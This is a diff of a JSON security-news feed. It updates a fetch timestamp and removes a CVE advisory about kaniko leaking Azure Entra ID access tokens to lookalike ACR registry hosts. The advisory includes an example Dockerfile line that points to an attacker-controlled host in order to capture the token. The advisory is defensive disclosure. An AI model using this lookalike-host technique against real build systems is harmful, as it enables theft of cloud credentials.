@@ -1,5 +1,5 @@
 {
-  "fetched_at": "2026-11-06T01:33:51.245855+09:00",
+  "fetched_at": "2026-11-06T02:03:23.733646+09:00",
   "security_news": [
     {
       "title": "Hackers backdoor Linux servers using trojanized CWP web server",
@@ -6826,21 +6826,6 @@
       "link": "https://cvefeed.io/vuln/detail/CVE-2026-49906",
       "source": "cvefeed",
       "published": "2026-11-03T05:21:08+09:00",
-      "lang": "en"
-    },
-    {
-      "title": "CVE-2026-105769 - kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts",
-      "summary": "CVE ID :CVE-2026-105769\n  \nPublished : Nov. 2, 2026, 4:49 p.m. | 17 minutes ago\n  \nDescription :kaniko before 1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to an attacker-controlled registry host. kaniko uses the Azure Container Registry credential helper github.com/chrismellard/docker-credential-acr-env, which decides whether a host is an ACR registry with an unanchored regular expression, so any hostname containing .azurecr.io, .azurecr.cn, .azurecr.de or .azurecr.us is accepted. kaniko consults this helper for any registry that has no credentials in the Docker config and is not a Google or Amazon ECR registry, before contacting the registry. A Dockerfile that references an image on a lookalike host, such as FROM x.azurecr.io.attacker.com/img or COPY --from=, causes the helper to obtain a token from the build's Azure identity (service principal environment variables, federated workload identity token, or managed identity) and POST it to https:///oauth2/exchange. The attacker can use the token against Azure Resource Manager with the identity's role assignments until it expires, and can exchange it for credentials to any ACR registry the identity can access. No RUN instruction or push is required. This issue is fixed in 1.25.20.\n  \nSeverity: 9.3 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "description": "CVE ID :CVE-2026-105769\n  \nPublished : Nov. 2, 2026, 4:49 p.m. | 17 minutes ago\n  \nDescription :kaniko before 1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to an attacker-controlled registry host. kaniko uses the Azure Container Registry credential helper github.com/chrismellard/docker-credential-acr-env, which decides whether a host is an ACR registry with an unanchored regular expression, so any hostname containing .azurecr.io, .azurecr.cn, .azurecr.de or .azurecr.us is accepted. kaniko consults this helper for any registry that has no credentials in the Docker config and is not a Google or Amazon ECR registry, before contacting the registry. A Dockerfile that references an image on a lookalike host, such as FROM x.azurecr.io.attacker.com/img or COPY --from=, causes the helper to obtain a token from the build's Azure identity (service principal environment variables, federated workload identity token, or managed identity) and POST it to https:///oauth2/exchange. The attacker can use the token against Azure Resource Manager with the identity's role assignments until it expires, and can exchange it for credentials to any ACR registry the identity can access. No RUN instruction or push is required. This issue is fixed in 1.25.20.\n  \nSeverity: 9.3 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "title_ko": null,
-      "summary_ko": null,
-      "summary_3lines": "1. CVE-2026-105769\n2. 26.11.03 오전1:49\n3. kaniko before 1.25.20 can send a Microsoft Entra I",
-      "cve_id": "CVE-2026-105769",
-      "cvss": "",
-      "severity": "",
-      "link": "https://cvefeed.io/vuln/detail/CVE-2026-105769",
-      "source": "cvefeed",
-      "published": "2026-11-03T01:49:24+09:00",
       "lang": "en"
     }
   ],
